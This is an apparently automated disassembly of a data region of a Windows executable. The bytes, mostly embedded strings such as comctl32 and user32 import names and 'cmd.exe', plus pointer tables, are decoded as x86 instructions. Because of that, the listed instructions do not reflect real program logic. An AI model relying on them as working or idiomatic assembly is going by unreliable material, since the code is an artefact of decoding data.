  427f86:	ins    BYTE PTR es:[edi],dx
  427f87:	popa   
  427f88:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427f8c:	je     0x427ff4
  427f8e:	ins    BYTE PTR es:[edi],dx
  427f8f:	jns    0x428006
  427f91:	push   0x6d6d6800
  427f96:	popa   
  427f97:	inc    edi
  427f98:	popa   
  427f99:	ins    BYTE PTR es:[edi],dx
  427f9a:	ins    BYTE PTR es:[edi],dx
  427f9b:	push   0x48007361
  427fa0:	outs   dx,DWORD PTR ds:[esi]
  427fa1:	ins    DWORD PTR es:[edi],dx
  427fa2:	outs   dx,DWORD PTR gs:[esi]
  427fa4:	jb     0x42800b
  427fa6:	data16 jno 0x428012
  427fa9:	jae    0x42800c
  427fab:	bound  esi,QWORD PTR [eax+0x61]
  427fae:	add    BYTE PTR [ebp+0x74],ah
  427fb1:	outs   dx,BYTE PTR ds:[esi]
  427fb2:	gs addr16 jbe 0x428017
  427fb6:	je     0x428031
  427fb8:	gs popa 
  427fba:	add    BYTE PTR [ebp+0x67],ah
  427fbd:	outs   dx,DWORD PTR ds:[esi]
  427fbe:	inc    edi
  427fbf:	popa   
  427fc0:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  427fc8:	jo     0x42802f
  427fca:	fs jbe 0x42802e
  427fcd:	je     0x428044
  427fcf:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  427fd3:	outs   dx,DWORD PTR ds:[esi]
  427fd4:	add    BYTE PTR [edx+0x0],ch
  427fd7:	jne    0x427fd9
  427fd9:	add    BYTE PTR [bp+0x0],ch
  427fdd:	popa   
  427fde:	add    BYTE PTR [esi+0x0],ch
  427fe1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  427fe6:	add    BYTE PTR [ebp+0x0],dh
  427fe9:	ins    DWORD PTR es:[edi],dx
  427fea:	add    BYTE PTR [eax],al
  427fec:	add    BYTE PTR [edi+0x0],ch
  427fef:	jb     0x427ff1
  427ff1:	ja     0x427ff3
  427ff3:	imul   eax,DWORD PTR [eax],0x680073
  427ff9:	outs   dx,BYTE PTR ds:[esi]
  427ffa:	add    BYTE PTR [ecx+0x0],ch
  427ffd:	add    BYTE PTR fs:[ecx+0x0],ch
  428001:	ja     0x428003
  428003:	imul   eax,DWORD PTR [eax],0x65006e
  428009:	push   0x70000000
  42800e:	add    BYTE PTR [ecx+0x0],ah
  428011:	je     0x428013
  428013:	jbe    0x428015
  428015:	add    BYTE PTR gs:[ebp+0x0],ah
  428019:	je     0x42801b
  42801b:	add    BYTE PTR gs:[edi+0x0],ah
  42801f:	ins    BYTE PTR es:[edi],dx
  428020:	add    BYTE PTR [ecx+0x0],ah
  428023:	imul   eax,DWORD PTR [eax],0x66
  428029:	outs   dx,DWORD PTR ds:[esi]
  42802a:	add    BYTE PTR [esi+0x0],ch
  42802d:	je     0x42802f
  42802f:	popa   
  428030:	add    BYTE PTR [edi+0x0],dh
  428033:	push   ebx
  428034:	add    BYTE PTR [edi+0x0],ch
  428037:	arpl   WORD PTR [eax],ax
  428039:	imul   eax,DWORD PTR [eax],0x61
  42803c:	add    BYTE PTR [esi+0x0],dh
  42803f:	outs   dx,DWORD PTR ds:[esi]
  428040:	add    BYTE PTR [eax],al
  428042:	add    BYTE PTR [ebp+0x0],ch
  428045:	jns    0x428047
  428047:	add    BYTE PTR gs:[esi+0x0],ah
  42804b:	ins    BYTE PTR es:[edi],dx
  42804c:	add    BYTE PTR [ecx+0x0],ah
  42804f:	jns    0x428051
  428051:	jbe    0x428053
  428053:	popa   
  428054:	add    BYTE PTR [esi+0x0],ch
  428057:	popa   
  428058:	add    BYTE PTR [edi+0x0],ah
  42805b:	outs   dx,DWORD PTR ds:[esi]
  42805c:	add    BYTE PTR [eax],al
  42805e:	add    BYTE PTR [edi+0x0],ch
  428061:	jb     0x428063
  428063:	jae    0x428065
  428065:	imul   eax,DWORD PTR [eax],0x47006e
  42806b:	imul   eax,DWORD PTR [eax],0x70006d
  428071:	bound  eax,QWORD PTR [eax]
  428073:	outs   dx,DWORD PTR ds:[esi]
  428074:	add    BYTE PTR [eax+0x0],dh
  428077:	imul   eax,DWORD PTR [eax],0x650000
  42807d:	js     0x42807f
  42807f:	jae    0x428081
  428081:	outs   dx,DWORD PTR ds:[esi]
  428082:	add    BYTE PTR [ebx+0x0],dh
  428085:	popa   
  428086:	add    BYTE PTR [esi+0x0],ch
  428089:	je     0x42808b
  42808b:	add    BYTE PTR [eax],al
  42808d:	bound  eax,QWORD PTR [eax]
  42808f:	jns    0x428091
  428091:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428096:	add    BYTE PTR [eax+eax*1+0x74],ah
  42809a:	add    BYTE PTR [ecx+0x0],ah
  42809d:	add    BYTE PTR [eax],al
  42809f:	js     0x4280a1
  4280a1:	imul   eax,DWORD PTR [eax],0x610054
  4280a7:	imul   eax,DWORD PTR [eax],0x48006e
  4280ad:	popa   
  4280ae:	add    BYTE PTR [esi+0x0],ch
  4280b1:	add    BYTE PTR fs:[eax],al
  4280b4:	add    BYTE PTR [edi+0x0],cl
  4280b7:	ja     0x4280b9
  4280b9:	ins    BYTE PTR es:[edi],dx
  4280ba:	add    BYTE PTR [ebx+0x0],dh
  4280bd:	popa   
  4280be:	add    BYTE PTR [ebx+0x0],dh
  4280c1:	jo     0x4280c3
  4280c3:	popa   
  4280c4:	add    BYTE PTR [ecx+0x0],ch
  4280c7:	imul   eax,DWORD PTR [eax],0x72
  4280ca:	add    BYTE PTR [ebp+0x0],ah
  4280cd:	jbe    0x4280cf
  4280cf:	add    BYTE PTR [eax],al
  4280d1:	jb     0x4280d3
  4280d3:	jne    0x4280d5
  4280d5:	je     0x4280d7
  4280d7:	ins    DWORD PTR es:[edi],dx
  4280d8:	add    BYTE PTR [ebp+0x0],dh
  4280db:	arpl   WORD PTR [eax],ax
  4280dd:	jne    0x4280df
  4280df:	jo     0x4280e1
  4280e1:	add    BYTE PTR [eax],al
  4280e3:	jae    0x4280e5
  4280e5:	outs   dx,DWORD PTR ds:[esi]
  4280e6:	add    BYTE PTR [esi+0x0],ah
  4280e9:	imul   eax,DWORD PTR [eax],0x630062
  4280ef:	outs   dx,DWORD PTR ds:[esi]
  4280f0:	add    BYTE PTR [ecx+0x0],ch
  4280f3:	jb     0x4280f5
  4280f5:	jae    0x4280f7
  4280f7:	outs   dx,DWORD PTR ds:[esi]
  4280f8:	add    BYTE PTR [eax],al
  4280fa:	add    BYTE PTR [ebx+0x0],dl
  4280fd:	outs   dx,DWORD PTR ds:[esi]
  4280fe:	add    BYTE PTR [ebx+0x0],ah
  428101:	popa   
  428102:	add    BYTE PTR [ecx+0x0],ch
  428105:	jae    0x428107
  428107:	data16 add BYTE PTR [ecx+0x0],ah
  42810b:	jb     0x42810d
  42810d:	popa   
  42810e:	add    BYTE PTR [ecx+0x0],ch
  428111:	add    BYTE PTR [eax],al
  428113:	add    BYTE PTR [esi],cl
  428115:	adc    BYTE PTR [eax],al
  428117:	out    0x67,eax
  428119:	adc    BYTE PTR [eax],al
  42811b:	js     0x428144
  42811d:	adc    BYTE PTR [eax],al
  42811f:	test   al,0x13
  428121:	adc    BYTE PTR [eax],al
  428123:	fs push esi
  428125:	adc    BYTE PTR [eax],al
  428127:	jp     0x428149
  428129:	adc    BYTE PTR [eax],al
  42812b:	enter  0x1052,0x0
  42812f:	loop   0x4281a4
  428131:	adc    BYTE PTR [eax],al
  428133:	ja     0x4281a0
  428135:	adc    BYTE PTR [eax],al
  428137:	cmp    al,0x2b
  428139:	adc    BYTE PTR [eax],al
  42813b:	rcl    BYTE PTR [edx],1
  42813d:	adc    BYTE PTR [eax],al
  42813f:	sbb    DWORD PTR [eax+0x10],ebx
  428142:	add    BYTE PTR [esi],ah
  428144:	add    dl,BYTE PTR [eax]
  428146:	add    BYTE PTR [edi+0xc],dh
  428149:	adc    BYTE PTR [eax],al
  42814b:	mov    dh,BYTE PTR [ecx]
  42814d:	adc    BYTE PTR [eax],al
  42814f:	out    dx,al
  428150:	sbb    eax,0xed80010
  428155:	adc    BYTE PTR [eax],al
  428157:	add    eax,0x3300107f
  42815c:	jbe    0x42816e
  42815e:	add    BYTE PTR [ebx],dl
  428160:	add    DWORD PTR [edx+0x0],0x428117
  428167:	sbb    eax,DWORD PTR [ecx-0x7ee0ffbe]
  42816d:	inc    edx
  42816e:	add    BYTE PTR [ebx],ah
  428170:	add    DWORD PTR [edx+0x0],0x428127
  428177:	sub    eax,DWORD PTR [ecx-0x7ed0ffbe]
  42817d:	inc    edx
  42817e:	add    BYTE PTR [ebx],dh
  428180:	add    DWORD PTR [edx+0x0],0x428137
  428187:	cmp    eax,DWORD PTR [ecx-0x7ec0ffbe]
  42818d:	inc    edx
  42818e:	add    BYTE PTR [ebx-0x7f],al
  428191:	inc    edx
  428192:	add    BYTE PTR [edi-0x7f],al
  428195:	inc    edx
  428196:	add    BYTE PTR [ebx-0x7f],cl
  428199:	inc    edx
  42819a:	add    BYTE PTR [edi-0x7f],cl
  42819d:	inc    edx
  42819e:	add    BYTE PTR [ebx-0x7f],dl
  4281a1:	inc    edx
  4281a2:	add    BYTE PTR [edi-0x7f],dl
  4281a5:	inc    edx
  4281a6:	add    BYTE PTR [ebx-0x7f],bl
  4281a9:	inc    edx
  4281aa:	add    bl,ch
  4281ac:	add    DWORD PTR [edx+0x0],0x4281ef
  4281b3:	repz add DWORD PTR [edx+0x0],0x4281f7
  4281bb:	sti    
  4281bc:	add    DWORD PTR [edx+0x0],0x4281ff
  4281c3:	add    eax,DWORD PTR [edx-0x7df8ffbe]
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [ebx],cl
  4281cc:	add    BYTE PTR [edx+0x0],0xf
  4281d0:	add    BYTE PTR [edx+0x0],0x13
  4281d4:	add    BYTE PTR [edx+0x0],0x17
  4281d8:	add    BYTE PTR [edx+0x0],0x1b
  4281dc:	add    BYTE PTR [edx+0x0],0x1f
  4281e0:	add    BYTE PTR [edx+0x0],0x23
  4281e4:	add    BYTE PTR [edx+0x0],0x27
  4281e8:	add    BYTE PTR [edx+0x0],0x29
  4281ec:	or     al,0x10
  4281ee:	add    BYTE PTR [edx-0x57ffefc2],dl
  4281f4:	push   edi
  4281f5:	adc    BYTE PTR [eax],al
  4281f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f8:	outs   dx,DWORD PTR ds:[esi]
  4281f9:	adc    BYTE PTR [eax],al
  4281fb:	push   ebx
  4281fc:	popa   
  4281fd:	adc    BYTE PTR [eax],al
  4281ff:	add    dh,BYTE PTR [ebp+0x10]
  428202:	add    dh,cl
  428204:	jle    0x428216
  428206:	add    BYTE PTR [esi+edx*2],dl
  428209:	adc    BYTE PTR [eax],al
  42820b:	mov    al,0x68
  42820d:	adc    BYTE PTR [eax],al
  42820f:	aas    
  428210:	inc    esp
  428211:	adc    BYTE PTR [eax],al
  428213:	pop    ebp
  428214:	and    DWORD PTR [eax],edx
  428216:	add    bl,dl
  428218:	jl     0x42822a
  42821a:	add    BYTE PTR [edx+0xb],dh
  42821d:	adc    BYTE PTR [eax],al
  42821f:	inc    edx
  428220:	push   eax
  428221:	adc    BYTE PTR [eax],al
  428223:	mov    ebp,0xbb001074
  428228:	pop    ds
  428229:	adc    BYTE PTR [eax],al
  42822b:	sub    DWORD PTR [eax+0x10],eax
  42822e:	add    BYTE PTR [ecx],dh
  428230:	ja     0x428242
  428232:	add    bl,dl
  428234:	sbb    dl,BYTE PTR [eax]
  428236:	add    BYTE PTR [esi+0x1e],ch
  428239:	adc    BYTE PTR [eax],al
  42823b:	or     ch,BYTE PTR [esi]
  42823d:	adc    BYTE PTR [eax],al
  42823f:	sbb    eax,0xa100103e
  428244:	data16 adc BYTE PTR [eax],al
  428247:	xchg   ecx,eax
  428248:	bound  edx,QWORD PTR [eax]
  42824a:	add    BYTE PTR [esi],bh
  42824c:	dec    edi
  42824d:	adc    BYTE PTR [eax],al
  42824f:	in     eax,dx
  428250:	adc    BYTE PTR fs:[eax],al
  428253:	sub    bl,BYTE PTR [ecx+0x10]
  428256:	add    BYTE PTR [esi+0x43],al
  428259:	adc    BYTE PTR [eax],al
  42825b:	imul   edi,DWORD PTR [eax+edx*1],0x0
  42825f:	rol    BYTE PTR [esi+0x10],0x0
  428263:	in     eax,0x31
  428265:	adc    BYTE PTR [eax],al
  428267:	mov    esp,0x2b00104f
  42826c:	add    BYTE PTR [edx+0x0],0x2f
  428270:	add    BYTE PTR [edx+0x0],0x33
  428274:	add    BYTE PTR [edx+0x0],0x37
  428278:	add    BYTE PTR [edx+0x0],0x3b
  42827c:	add    BYTE PTR [edx+0x0],0x3f
  428280:	add    BYTE PTR [edx+0x0],0x43
  428284:	add    BYTE PTR [edx+0x0],0x47
  428288:	add    BYTE PTR [edx+0x0],0x4b
  42828c:	add    BYTE PTR [edx+0x0],0x4f
  428290:	add    BYTE PTR [edx+0x0],0x53
  428294:	add    BYTE PTR [edx+0x0],0x57
  428298:	add    BYTE PTR [edx+0x0],0x5b
  42829c:	add    BYTE PTR [edx+0x0],0x5f
  4282a0:	add    BYTE PTR [edx+0x0],0x63
  4282a4:	add    BYTE PTR [edx+0x0],0x67
  4282a8:	add    BYTE PTR [edx+0x0],0xe1
  4282ac:	and    dl,BYTE PTR [eax]
  4282ae:	add    bh,bh
  4282b0:	push   ecx
  4282b1:	adc    BYTE PTR [eax],al
  4282b3:	test   BYTE PTR ds:0x1d0c0010,0x10
  4282ba:	add    BYTE PTR [ebx],al
  4282bc:	sbb    dl,BYTE PTR [eax]
  4282be:	add    ch,ah
  4282c0:	or     dl,BYTE PTR [eax]
  4282c2:	add    BYTE PTR [edi+0x42001035],bl
  4282c8:	pop    edi
  4282c9:	adc    BYTE PTR [eax],al
  4282cb:	adc    eax,0xd300103f
  4282d0:	cmp    dl,BYTE PTR [eax]
  4282d2:	add    BYTE PTR [ebp+0x1001021],ah
  4282d8:	sbb    al,0x10
  4282da:	add    BYTE PTR [ebx-0x1effefd7],ch
  4282e0:	adc    BYTE PTR cs:[eax],al
  4282e3:	push   eax
  4282e4:	adc    BYTE PTR [bx+si],al
  4282e7:	mov    edi,0xab00102d
  4282ec:	add    BYTE PTR [edx+0x0],0xaf
  4282f0:	add    BYTE PTR [edx+0x0],0xb3
  4282f4:	add    BYTE PTR [edx+0x0],0xb7
  4282f8:	add    BYTE PTR [edx+0x0],0xbb
  4282fc:	add    BYTE PTR [edx+0x0],0xbf
  428300:	add    BYTE PTR [edx+0x0],0xc3
  428304:	add    BYTE PTR [edx+0x0],0xc7
  428308:	add    BYTE PTR [edx+0x0],0xcb
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0x98
  42832c:	pusha  
  42832d:	adc    BYTE PTR [eax],al
  42832f:	pop    ebp
  428330:	js     0x428342
  428332:	add    BYTE PTR [esi],bh
  428334:	dec    eax
  428335:	adc    BYTE PTR [eax],al
  428337:	cmp    al,0x7a
  428339:	adc    BYTE PTR [eax],al
  42833b:	aam    0x9
  42833d:	adc    BYTE PTR [eax],al
  42833f:	or     cl,BYTE PTR [ebx]
  428341:	adc    BYTE PTR [eax],al
  428343:	pop    ebx
  428344:	push   ebp
  428345:	adc    BYTE PTR [eax],al
  428347:	mov    esi,0x6001032
  42834c:	xor    edx,DWORD PTR [eax]
  42834e:	add    BYTE PTR [esi-0x16ffefc0],al
  428354:	and    eax,0x61460010
  428359:	adc    BYTE PTR [eax],al
  42835b:	adc    DWORD PTR [ebp+0x10],ebp
  42835e:	add    al,al
  428360:	dec    esi
  428361:	adc    BYTE PTR [eax],al
  428363:	jae    0x428383
  428365:	adc    BYTE PTR [eax],al
  428367:	dec    ebx
  428368:	add    eax,0x832b0010
  42836d:	inc    edx
  42836e:	add    BYTE PTR [edi],ch
  428370:	add    DWORD PTR [edx+0x0],0x33
  428374:	add    DWORD PTR [edx+0x0],0x37
  428378:	add    DWORD PTR [edx+0x0],0x3b
  42837c:	add    DWORD PTR [edx+0x0],0x3f
  428380:	add    DWORD PTR [edx+0x0],0x43
  428384:	add    DWORD PTR [edx+0x0],0x47
  428388:	add    DWORD PTR [edx+0x0],0x4b
  42838c:	add    DWORD PTR [edx+0x0],0x4f
  428390:	add    DWORD PTR [edx+0x0],0x53
  428394:	add    DWORD PTR [edx+0x0],0x57
  428398:	add    DWORD PTR [edx+0x0],0x5b
  42839c:	add    DWORD PTR [edx+0x0],0x5f
  4283a0:	add    DWORD PTR [edx+0x0],0x63
  4283a4:	add    DWORD PTR [edx+0x0],0x67
  4283a8:	add    DWORD PTR [edx+0x0],0x0
	...
  4283b4:	cmp    dh,BYTE PTR [ecx+0x52]
  4283b7:	dec    edi
  4283b8:	add    BYTE PTR [eax],al
  4283ba:	add    BYTE PTR [eax],al
  4283bc:	adc    BYTE PTR [ebp+0x10002],cl
  4283c2:	add    BYTE PTR [eax],al
  4283c4:	add    DWORD PTR [eax],eax
  4283c6:	add    BYTE PTR [eax],al
  4283c8:	add    DWORD PTR [eax],eax
  4283ca:	add    BYTE PTR [eax],al
  4283cc:	loopne 0x42835a
  4283ce:	add    al,BYTE PTR [eax]
  4283d0:	add    BYTE PTR [ebp-0x730ffffe],cl
  4283d6:	add    al,BYTE PTR [eax]
	...
  4283e4:	test   al,0x85
  4283e6:	add    al,BYTE PTR [eax]
  4283e8:	les    eax,FWORD PTR [ebp-0x7a29fffe]
  4283ee:	add    al,BYTE PTR [eax]
  4283f0:	call   0x42867a
  4283f5:	xchg   BYTE PTR [edx],al
  4283f7:	add    BYTE PTR [esi+eax*4],dl
  4283fa:	add    al,BYTE PTR [eax]
  4283fc:	xchg   BYTE PTR cs:[edx],al
  4283ff:	add    BYTE PTR [eax],al
  428401:	add    BYTE PTR [eax],al
  428403:	add    BYTE PTR [eax-0x7a],dl
  428406:	add    al,BYTE PTR [eax]
  428408:	outs   dx,BYTE PTR ds:[esi]
  428409:	xchg   BYTE PTR [edx],al
  42840b:	add    BYTE PTR [esi+eax*4+0x2],bh
  42840f:	add    BYTE PTR [edx-0x61fffd7a],cl
  428415:	xchg   BYTE PTR [edx],al
  428417:	add    BYTE PTR [esi+eax*4-0x7941fffe],ch
  42841e:	add    al,BYTE PTR [eax]
  428420:	rol    BYTE PTR [esi-0x7921fffe],1
  428426:	add    al,BYTE PTR [eax]
  428428:	lock xchg BYTE PTR [edx],al
  42842b:	add    BYTE PTR [edx],al
  42842d:	xchg   DWORD PTR [edx],eax
  42842f:	add    BYTE PTR [eax],dl
  428431:	xchg   DWORD PTR [edx],eax
  428433:	add    BYTE PTR [esi],bl
  428435:	xchg   DWORD PTR [edx],eax
  428437:	add    BYTE PTR [eax],dh
  428439:	xchg   DWORD PTR [edx],eax
  42843b:	add    BYTE PTR [edi+eax*4],bh
  42843e:	add    al,BYTE PTR [eax]
  428440:	push   edx
  428441:	xchg   DWORD PTR [edx],eax
  428443:	add    BYTE PTR [edi+eax*4+0x2],ah
  428447:	add    BYTE PTR [esi-0x79],dh
  42844a:	add    al,BYTE PTR [eax]
  42844c:	add    BYTE PTR [edi-0x786dfffe],0x2
  428453:	add    BYTE PTR [edx-0x47fffd79],ah
  428459:	xchg   DWORD PTR [edx],eax
  42845b:	add    ah,al
  42845d:	xchg   DWORD PTR [edx],eax
  42845f:	add    dh,dl
  428461:	xchg   DWORD PTR [edx],eax
  428463:	add    ah,ch
  428465:	xchg   DWORD PTR [edx],eax
  428467:	add    dh,bh
  428469:	xchg   DWORD PTR [edx],eax
  42846b:	add    BYTE PTR [eax+ecx*4],cl
  42846e:	add    al,BYTE PTR [eax]
  428470:	sbb    al,0x88
  428472:	add    al,BYTE PTR [eax]
  428474:	mov    BYTE PTR cs:[edx],al
  428477:	add    BYTE PTR [edx-0x78],al
  42847a:	add    al,BYTE PTR [eax]
  42847c:	pop    eax
  42847d:	mov    BYTE PTR [edx],al
  42847f:	add    BYTE PTR [edx-0x78],ch
  428482:	add    al,BYTE PTR [eax]
  428484:	jl     0x42840e
  428486:	add    al,BYTE PTR [eax]
  428488:	mov    WORD PTR [eax-0x7763fffe],cs
  42848e:	add    al,BYTE PTR [eax]
  428490:	lods   al,BYTE PTR ds:[esi]
  428491:	mov    BYTE PTR [edx],al
  428493:	add    BYTE PTR [esi-0x33fffd78],bh
  428499:	mov    BYTE PTR [edx],al
  42849b:	add    dl,bl
  42849d:	mov    BYTE PTR [edx],al
  42849f:	add    dl,dh
  4284a1:	mov    BYTE PTR [edx],al
  4284a3:	add    BYTE PTR [ecx+ecx*4],al
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	push   ss
  4284a9:	mov    DWORD PTR [edx],eax
  4284ab:	add    BYTE PTR [edx],ah
  4284ad:	mov    DWORD PTR [edx],eax
  4284af:	add    BYTE PTR [esi],ch
  4284b1:	mov    DWORD PTR [edx],eax
  4284b3:	add    BYTE PTR [edx],bh
  4284b5:	mov    DWORD PTR [edx],eax
  4284b7:	add    BYTE PTR [edx-0x77],cl
  4284ba:	add    al,BYTE PTR [eax]
  4284bc:	pusha  
  4284bd:	mov    DWORD PTR [edx],eax
  4284bf:	add    BYTE PTR [esi-0x77],ch
  4284c2:	add    al,BYTE PTR [eax]
  4284c4:	or     BYTE PTR [ecx-0x766dfffe],0x2
  4284cb:	add    BYTE PTR [eax],al
  4284cd:	add    BYTE PTR [eax],al
  4284cf:	add    BYTE PTR [ecx+ecx*4+0x2],ch
  4284d6:	add    BYTE PTR [eax],al
  4284d8:	retf   0x289
  4284db:	add    ah,bl
  4284dd:	mov    DWORD PTR [edx],eax
  4284df:	add    dh,ch
  4284e1:	mov    DWORD PTR [edx],eax
  4284e3:	add    BYTE PTR [edx+ecx*4],al
  4284e6:	add    al,BYTE PTR [eax]
  4284e8:	push   ss
  4284e9:	mov    al,BYTE PTR [edx]
  4284eb:	add    BYTE PTR [eax],ch
  4284ed:	mov    al,BYTE PTR [edx]
  4284ef:	add    BYTE PTR [eax],bh
  4284f1:	mov    al,BYTE PTR [edx]
  4284f3:	add    BYTE PTR [esi-0x76],dl
  4284f6:	add    al,BYTE PTR [eax]
  4284f8:	data16 mov al,BYTE PTR [edx]
  4284fb:	add    BYTE PTR [edx+ecx*4+0x2],dh
  4284ff:	add    BYTE PTR [edx+ecx*4-0x756dfffe],al
  428506:	add    al,BYTE PTR [eax]
  428508:	mov    ds:0xae00028a,al
  42850d:	mov    al,BYTE PTR [edx]
  42850f:	add    al,al
  428511:	mov    al,BYTE PTR [edx]
  428513:	add    dl,dl
  428515:	mov    al,BYTE PTR [edx]
  428517:	add    al,ch
  428519:	mov    al,BYTE PTR [edx]
  42851b:	add    dh,dh
  42851d:	mov    al,BYTE PTR [edx]
  42851f:	add    BYTE PTR [edx],al
  428521:	mov    eax,DWORD PTR [edx]
  428523:	add    BYTE PTR [ebx+ecx*4],bl
  428526:	add    al,BYTE PTR [eax]
  428528:	xor    al,0x8b
  42852a:	add    al,BYTE PTR [eax]
  42852c:	dec    esp
  42852d:	mov    eax,DWORD PTR [edx]
  42852f:	add    BYTE PTR [edx-0x75],bl
  428532:	add    al,BYTE PTR [eax]
  428534:	mov    ax,WORD PTR [edx]
  428537:	add    BYTE PTR [eax-0x75],bh
  42853a:	add    al,BYTE PTR [eax]
  42853c:	add    BYTE PTR [eax],al
  42853e:	add    BYTE PTR [eax],al
  428540:	cwde   
  428541:	mov    eax,DWORD PTR [edx]
  428543:	add    BYTE PTR [edx-0x4ffffd75],ah
  428549:	mov    eax,DWORD PTR [edx]
  42854b:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],bh
  428552:	add    al,BYTE PTR [eax]
  428554:	fimul  DWORD PTR [ebx-0x7419fffe]
  42855a:	add    al,BYTE PTR [eax]
  42855c:	lock mov eax,DWORD PTR [edx]
  42855f:	add    BYTE PTR [edx],al
  428561:	mov    WORD PTR [edx],es
  428563:	add    BYTE PTR [eax],bl
  428565:	mov    WORD PTR [edx],es
  428567:	add    BYTE PTR [esi],ch
  428569:	mov    WORD PTR [edx],es
  42856b:	add    BYTE PTR [esp+ecx*4+0x2],al
  42856f:	add    BYTE PTR [esp+ecx*4+0x2],dl
  428573:	add    BYTE PTR [esp+ecx*4+0x2],ah
  428577:	add    BYTE PTR [esp+ecx*4+0x2],dh
  42857b:	add    BYTE PTR [edx-0x65fffd74],al
  428581:	mov    WORD PTR [edx],es
  428583:	add    BYTE PTR [esp+ecx*4-0x734ffffe],ah
  42858a:	add    al,BYTE PTR [eax]
  42858c:	mov    esi,0x28c
	...
  42859d:	add    BYTE PTR [eax],al
  42859f:	add    BYTE PTR [ebx+0x6d],ah
  4285a2:	fs cs gs js 0x42860c
  4285a7:	add    BYTE PTR [edi],dl
  4285a9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285ad:	je     0x428621
  4285af:	outs   dx,DWORD PTR ds:[esi]
  4285b0:	jns    0x428602
  4285b2:	jb     0x428623
  4285b4:	jo     0x42861b
  4285b6:	jb     0x42862c
  4285b8:	jns    0x42860d
  4285ba:	push   0x50746565
  4285bf:	popa   
  4285c0:	add    BYTE PTR gs:[bx+si],al
  4285c4:	pop    esp
  4285c5:	add    BYTE PTR [eax+0x72],dl
  4285c8:	outs   dx,DWORD PTR ds:[esi]
  4285c9:	jo     0x428630
  4285cb:	jb     0x428641
  4285cd:	jns    0x428622
  4285cf:	push   0x57746565
  4285d4:	add    BYTE PTR [eax],al
  4285d6:	pop    ebx
  4285d7:	add    BYTE PTR [eax+0x72],dl
  4285da:	outs   dx,DWORD PTR ds:[esi]
  4285db:	jo     0x428642
  4285dd:	jb     0x428653
  4285df:	jns    0x428634
  4285e1:	push   0x41746565
  4285e6:	add    BYTE PTR [eax],al
  4285e8:	dec    esi
  4285e9:	add    BYTE PTR [ecx+0x6d],cl
  4285ec:	popa   
  4285ed:	addr16 gs dec esp
  4285f0:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  4285f7:	ins    BYTE PTR es:[edi],dx
  4285f8:	popa   
  4285f9:	arpl   WORD PTR [ebp+0x49],sp
  4285fc:	arpl   WORD PTR [edi+0x6e],bp
  4285ff:	add    BYTE PTR [ecx],dh
  428601:	add    BYTE PTR [ecx+0x6d],cl
  428604:	popa   
  428605:	addr16 gs dec esp
  428608:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42860f:	je     0x428683
  428611:	outs   dx,DWORD PTR ds:[esi]
  428612:	jns    0x428614
  428614:	inc    eax
  428615:	add    BYTE PTR [ecx+0x6d],cl
  428618:	popa   
  428619:	addr16 gs dec esp
  42861c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428623:	dec    ecx
  428624:	ins    DWORD PTR es:[edi],dx
  428625:	popa   
  428626:	addr16 gs inc ebx
  428629:	outs   dx,DWORD PTR ds:[esi]
  42862a:	jne    0x42869a
  42862c:	je     0x42862e
  42862e:	dec    esp
  42862f:	add    BYTE PTR [ecx+0x6d],cl
  428632:	popa   
  428633:	addr16 gs dec esp
  428636:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42863d:	outs   dx,DWORD PTR ds:[esi]
  42863e:	jbe    0x4286a5
  428640:	add    BYTE PTR [eax],al
  428642:	inc    ebx
  428643:	dec    edi
  428644:	dec    ebp
  428645:	inc    ebx
  428646:	push   esp
  428647:	dec    esp
  428648:	xor    esi,DWORD PTR [edx]
  42864a:	cs fs ins BYTE PTR es:[edi],dx
  42864d:	ins    BYTE PTR es:[edi],dx
  42864e:	add    BYTE PTR [eax],al
  428650:	push   edi
  428651:	add    BYTE PTR [ebx+0x72],al
  428654:	gs popa 
  428656:	je     0x4286bd
  428658:	inc    esp
  428659:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  428660:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428668:	jb     0x4286cb
  42866a:	ins    DWORD PTR es:[edi],dx
  42866b:	push   edi
  42866c:	add    BYTE PTR [eax],al
  42866e:	xor    al,BYTE PTR [edx]
  428670:	push   ebx
  428671:	gs je  0x4286b7
  428674:	popa   
  428675:	jb     0x4286dc
  428677:	je     0x4286c9
  428679:	outs   dx,DWORD PTR ds:[esi]
  42867a:	jae    0x42867c
  42867c:	cmp    al,BYTE PTR [ecx]
  42867e:	inc    edi
  42867f:	gs je  0x4286cf
  428682:	gs jae 0x4286f8
  428685:	popa   
  428686:	addr16 gs inc ecx
  428689:	add    BYTE PTR [edx+0x61724400],dh
  42868f:	ja     0x4286d7
  428691:	jb     0x4286f4
  428693:	ins    DWORD PTR es:[edi],dx
  428694:	gs inc ebx
  428696:	outs   dx,DWORD PTR ds:[esi]
  428697:	outs   dx,BYTE PTR ds:[esi]
  428698:	je     0x42870c
  42869a:	outs   dx,DWORD PTR ds:[esi]
  42869b:	ins    BYTE PTR es:[edi],dx
  42869c:	add    BYTE PTR [eax],al
  42869e:	sbb    BYTE PTR [ecx],al
  4286a0:	inc    edi
  4286a1:	gs je  0x4286ed
  4286a4:	arpl   WORD PTR [edi+0x6e],bp
  4286a7:	dec    ecx
  4286a8:	outs   dx,BYTE PTR ds:[esi]
  4286a9:	outs   dx,WORD PTR ds:[esi]
  4286ab:	add    bl,bh
  4286ad:	add    dl,BYTE PTR [edx+esi*2+0x61]
  4286b1:	arpl   WORD PTR [ebx+0x50],bp
  4286b4:	outs   dx,DWORD PTR ds:[esi]
